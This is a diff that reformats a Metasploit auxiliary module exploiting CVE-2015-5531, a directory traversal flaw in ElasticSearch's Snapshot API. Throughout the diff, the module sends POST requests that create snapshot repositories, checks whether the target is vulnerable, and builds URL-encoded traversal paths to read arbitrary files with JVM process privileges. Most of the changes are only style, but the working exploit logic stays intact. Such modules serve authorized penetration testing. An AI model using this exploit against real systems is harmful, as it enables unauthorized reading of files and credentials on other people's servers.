@@ -11,26 +11,27 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
-      'Description'    => %q{
-        'This module exploits a directory traversal vulnerability in
-        ElasticSearch, allowing an attacker to read arbitrary files
-        with JVM process privileges, through the Snapshot API.'
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'ElasticSearch Snapshot API Directory Traversal',
+        'Description' => %q{
+          'This module exploits a directory traversal vulnerability in
+          ElasticSearch, allowing an attacker to read arbitrary files
+          with JVM process privileges, through the Snapshot API.'
+        },
+        'References' => [
           ['CVE', '2015-5531'],
           ['PACKETSTORM', '132721']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Benjamin Smith', # Vulnerability Discovery
           'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
           'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE
+      )
+    )
 
     register_options(
       [
@@ -41,17 +42,17 @@ class MetasploitModule < Msf::Auxiliary
     )
   end
 
-  def check_host(ip)
+  def check_host(_ip)
     res1 = send_request_raw(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
-      'data'   => '{"type":"fs","settings":{"location":"dsr"}}'
+      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
+      'data' => '{"type":"fs","settings":{"location":"dsr"}}'
     )
 
     res2 = send_request_raw(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
-      'data'   => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
+      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
+      'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
     )
 
     if res1.body.include?('true') && res2.body.include?('true')
@@ -69,11 +70,11 @@ class MetasploitModule < Msf::Auxiliary
     travs << payload.gsub('/', '%2f')
     travs << file.gsub('/', '%2f')
 
-    vprint_status("Retrieving file contents...")
+    vprint_status('Retrieving file contents...')
 
     res = send_request_raw(
       'method' => 'GET',
-      'uri'    => travs
+      'uri' => travs
     )
 
     if res && res.code == 400
@@ -89,17 +90,17 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Checking if it's a vulnerable ElasticSearch")
 
     check_code = check_host(ip)
-    print_status("#{check_code.message}")
+    print_status(check_code.message.to_s)
     if check_host(ip) != Exploit::CheckCode::Appears
       return
     end
 
     filename = datastore['FILEPATH']
-    filename = filename[1, filename.length] if filename =~ %r{/^\//}
+    filename = filename[1, filename.length] if filename =~ %r{/^//}
 
     contents = read_file(filename)
     unless contents
-      print_error("No file downloaded")
+      print_error('No file downloaded')
       return
     end
 
